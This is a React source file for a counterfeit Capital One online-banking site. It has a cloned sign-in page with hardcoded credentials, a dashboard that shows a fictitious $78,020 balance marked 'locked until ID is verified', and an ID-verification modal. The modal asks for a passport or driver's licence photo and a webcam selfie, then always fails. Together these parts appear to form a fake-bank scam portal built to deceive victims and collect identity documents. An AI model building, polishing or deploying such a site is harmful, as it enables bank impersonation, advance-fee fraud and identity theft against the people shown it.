import React, { useState, useEffect, useRef } from 'react';
import {
  Lock,
  CheckCircle,
  Fingerprint,
  LogOut,
  Banknote,
  CreditCard,
  PercentCircle,
  XCircle,
} from 'lucide-react';
import { motion, AnimatePresence } from 'framer-motion';
import './App.css';
import logo from './assets/logo.svg';
import fdicLogo from './assets/fdic.svg';
import houseLogo from './assets/house.svg';



const mockUserData = {
  name: 'Jennifer Bilotta',
  balance: 78020,
  accountStatus: 'Account locked until ID is verified.',
  accountNumber: '3530******',
  routingNumber: '031176110',
};

const pageVariants = {
  hidden: { opacity: 0, y: 20 },
  visible: { opacity: 1, y: 0, transition: { duration: 0.5 } },
  exit: { opacity: 0, y: -20, transition: { duration: 0.3 } },
};

const LoginPage = ({ onLogin }) => {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [remember, setRemember] = useState(false);
  const [error, setError] = useState('');
  const [loading, setLoading] = useState(false);
   const [country, setCountry] = useState('United States');
  const [language, setLanguage] = useState('English');

  const handleSubmit = (e) => {
    e.preventDefault();
    if (!username || !password) {
      setError('Please fill in all fields.');
      return;
    }
    setLoading(true);
    setTimeout(() => {
      if (username === 'JenniferB1984' && password === 'Jen&Bob2022') {
        localStorage.setItem('isLoggedIn', 'true');
        onLogin();
      } else {
        setError('Invalid credentials. Please try again.');
      }
      setLoading(false);
    }, 1000);
  };

  return (
    <motion.div className="container-center" variants={pageVariants} initial="hidden" animate="visible" exit="exit">
      <nav className="navbar">
      <div className="navbar-left">
        <img src={logo} alt="Logo" className="navbar-logo" />
      </div>
      <div className="navbar-right">
        <select
          className="navbar-select"
          value={country}
          onChange={(e) => setCountry(e.target.value)}
        >
          <option value="United States">United States</option>
          <option value="Canada">Canada</option>
          <option value="United Kingdom">United Kingdom</option>
        </select>

        <select
          className="navbar-select-lang"
          value={language}
          onChange={(e) => setLanguage(e.target.value)}
        >
          <option value="English">English</option>
          <option value="Español">Español</option>
        </select>
      </div>
    </nav>
    <div className='Space'></div>
      <div className="card">
        <img src={logo} alt="Capital One Logo" className="logo" />
        <p className="subheading">Sign In</p>
        <form onSubmit={handleSubmit}>
          <div className="form-group">
            <label className="label">Username</label>
            <input
              className="input"
              type="text"
              value={username}
              onChange={(e) => setUsername(e.target.value)}
              placeholder="Enter your username"
              disabled={loading}
            />
          </div>
          <div className="form-group">
            <label className="label">Password</label>
            <input
              className="input"
              type="password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              placeholder="Enter your password"
              disabled={loading}
            />
          </div>

          <div className="form-group horizontal-space-between">
            <label className="remember-label">
              <input
                type="checkbox"
                checked={remember}
                onChange={(e) => setRemember(e.target.checked)}
                disabled={loading}
              />
              Remember me
            </label>
           
          </div>

          {error && <p className="error">{error}</p>}

          <button type="submit" className="button" disabled={loading}>
            {loading ? 'Signing in...' : 'Sign In'}
          </button>

           <a
              href="https://verified.capitalone.com/sign-in-help/pii?client=SIC"
              className="link"
              target="_blank"
              rel="noopener noreferrer"
            >
              Forgot Username or Password?
            </a>
            <a
            href="https://verified.capitalone.com/enroll/pii?originatorId=SIC"
            className="link"
            target="_blank"
            rel="noopener noreferrer"
          >
            Set Up Online Access
          </a>
        </form>
      </div>

       <div className="account-section">
          <p className="subheading-small">Looking for these accounts?</p>
          <div className="account-links">
            <a href="https://verified.capitalone.com/auth/other-products" className="link">Commercial or Trade Credit</a>
          </div>
        </div>

      <footer className="footer">
        <div className="footer-links">
          <a href="https://www.capitalone.com/help-center/contact-us/" className="footer-link">Contact Us</a>
          <a href="https://www.capitalone.com/digital/disclosures/" className="footer-link">Legal</a>
          <a href="https://www.capitalone.com/privacy" className="footer-link">Privacy</a>
          <a href="https://www.capitalone.com/digital/identity-protection/" className="footer-link">Security</a>
          <a href="https://www.capitalone.com/digital/corporate-terms/" className="footer-link">Terms & Conditions</a>
          <a href="https://www.capitalone.com/accessibility/" className="footer-link">Accessibility</a>
        </div>
        <div className="footer-logos">
          <img src={fdicLogo} alt="FDIC Logo" className="footer-logo" />
          <img src={houseLogo} alt="Equal Housing Lender Logo" className="footer-logo" />
        </div>
      </footer>
    </motion.div>
  );
};

const LandingPage = ({ onVerifyId, onLogout }) => {
  const statusClass = mockUserData.accountStatus.includes('locked') ? 'status locked' : 'status unlocked';
     const [country, setCountry] = useState('United States');
  const [language, setLanguage] = useState('English');

  return (
     <><nav className="navbar">
      <div className="navbar-left">
        <img src={logo} alt="Logo" className="navbar-logo" />
      </div>
      <div className="navbar-right">
        <select
          className="navbar-select"
          value={country}
          onChange={(e) => setCountry(e.target.value)}
        >
          <option value="United States">United States</option>
          <option value="Canada">Canada</option>
          <option value="United Kingdom">United Kingdom</option>
        </select>

        <select
          className="navbar-select-lang"
          value={language}
          onChange={(e) => setLanguage(e.target.value)}
        >
          <option value="English">English</option>
          <option value="Español">Español</option>
        </select>
      </div>
    </nav><div className='Space'></div>
    <motion.div className="page" variants={pageVariants} initial="hidden" animate="visible" exit="exit">

        <div>
          <h2 className="heading" style={{ display: 'flex', alignItems: 'center', gap: '0.5rem' }}>
            <Fingerprint size={20} /> Hi, {mockUserData.name}
          </h2>
          <p className="text-small">Your Account Overview</p>
        </div>

        <div className="section">
          <div>
            <p className="section-info" style={{ display: 'flex', alignItems: 'center', gap: '0.5rem' }}>
              <Banknote size={20} /> Balance
            </p>
            <p className="section-value">${mockUserData.balance.toLocaleString()}</p>
          </div>
          <div>
            <p className="section-info">Account No.</p>
            <p>{mockUserData.accountNumber}</p>
          </div>
          <div>
            <p className="section-info">Routing No.</p>
            <p>{mockUserData.routingNumber}</p>
          </div>
          <div className={statusClass}>
            {mockUserData.accountStatus.includes('locked') ? <Lock size={16} /> : <CheckCircle size={16} />}
            {mockUserData.accountStatus}
          </div>
        </div>

        <div className="section-three">
          <button className="blue-button" onClick={onVerifyId}><CreditCard size={16} /> Cards</button>
          <button className="blue-button" onClick={onVerifyId}><PercentCircle size={16} /> Rates</button>
          <button className="button" onClick={onVerifyId}>Verify ID</button>
        </div>

        <button className="logout-button" onClick={onLogout}>
          <LogOut size={16} /> Logout
        </button>
      </motion.div></>
  );
};

const IDVerificationPage = ({ onClose }) => {
  const [isVerified, setIsVerified] = useState(false);
  const [verificationStep, setVerificationStep] = useState(1);
  const [error, setError] = useState('');
  const [loading, setLoading] = useState(false);
  const [idPhoto, setIdPhoto] = useState(null);
  const [selfie, setSelfie] = useState(null);
  const [stream, setStream] = useState(null);
  const videoRef = useRef(null);
  const canvasRef = useRef(null);

  useEffect(() => {
    if (verificationStep === 2) {
      navigator.mediaDevices
        .getUserMedia({ video: { facingMode: 'user' } })
        .then((mediaStream) => {
          setStream(mediaStream);
          if (videoRef.current) {
            videoRef.current.srcObject = mediaStream;
          }
        })
        .catch(() => setError('Unable to access camera. Please allow permissions.'));
    }

    return () => {
      stream?.getTracks().forEach(track => track.stop());
    };
  }, [verificationStep]);

  const handleVerification = () => {
    if (verificationStep === 1 && idPhoto) {
      setLoading(true);
      setTimeout(() => {
        setVerificationStep(2);
        setLoading(false);
      }, 1500);
    } else if (verificationStep === 2 && selfie) {
      setLoading(true);
      setTimeout(() => {
        setError('Verification failed. Please provide correct details.');
        setLoading(false);
      }, 2000);
    } else {
      setError('Please complete all required steps.');
    }
  };

  const handleFileChange = (e) => {
    const file = e.target.files?.[0];
    if (file) {
      setIdPhoto(file);
      setError('');
    }
  };

  const captureSelfie = () => {
    if (!videoRef.current || !canvasRef.current) return;

    const video = videoRef.current;
    const canvas = canvasRef.current;
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);

    canvas.toBlob((blob) => {
      if (blob) {
        setSelfie(blob);
        setError('');
      }
    }, 'image/jpeg');
  };

  useEffect(() => {
    if (isVerified) {
      const timer = setTimeout(() => onClose(), 3000);
      return () => clearTimeout(timer);
    }
  }, [isVerified, onClose]);

  return (
    <motion.div className="modal">
      <div className="modal-content">
        <h2 className="modal-title"><Fingerprint size={20} /> ID Verification</h2>
        <p className="text-small">
          {isVerified
            ? 'Your ID has been successfully verified.'
            : 'Please follow the steps below to verify your identity.'}
        </p>

        {!isVerified && (
          <div className="space-y-3">
            {verificationStep === 1 && (
              <div>
                <p className="text-small">Step 1: Upload your Valid Passport or Driver's License.</p>
                <input type="file" accept="image/*" onChange={handleFileChange} disabled={loading} />
              </div>
            )}

            {verificationStep === 2 && (
              <div>
                <p className="text-small">Step 2: Take a selfie to verify your identity.</p>
                <video ref={videoRef} autoPlay playsInline style={{ width: '100%', borderRadius: '8px' }} />
                <canvas ref={canvasRef} style={{ display: 'none' }} />
                <button className="button" onClick={captureSelfie} disabled={loading}>
                  Capture Selfie
                </button>
              </div>
            )}

            <button className="button" onClick={handleVerification} disabled={loading}>
              {loading ? 'Verifying...' : verificationStep === 1 ? 'Upload ID' : 'Submit Selfie'}
            </button>

            {error && <p className="error"><XCircle size={16} /> {error}</p>}
            <button className="cancel-button" onClick={onClose}>Cancel</button>
          </div>
        )}

        {isVerified && (
          <div className="success-message"><CheckCircle size={24} /> Verification Failed!</div>
        )}
      </div>
    </motion.div>
  );
};


const App = () => {
  const [isLoggedIn, setIsLoggedIn] = useState(() => localStorage.getItem('isLoggedIn') === 'true');
  const [showVerification, setShowVerification] = useState(false);

  const handleLogin = () => setIsLoggedIn(true);
  const handleLogout = () => {
    setIsLoggedIn(false);
    localStorage.removeItem('isLoggedIn');
  };
  const handleVerifyId = () => setShowVerification(true);
  const handleCloseVerification = () => setShowVerification(false);

  useEffect(() => {
    localStorage.setItem('isLoggedIn', String(isLoggedIn));
  }, [isLoggedIn]);

  return (
    <div>
      <AnimatePresence mode="wait">
        {isLoggedIn ? (
          <>
            <LandingPage key="landing" onVerifyId={handleVerifyId} onLogout={handleLogout} />
            {showVerification && <IDVerificationPage key="verify" onClose={handleCloseVerification} />}
          </>
        ) : (
          <LoginPage key="login" onLogin={handleLogin} />
        )}
      </AnimatePresence>
    </div>
  );
};

export default App;
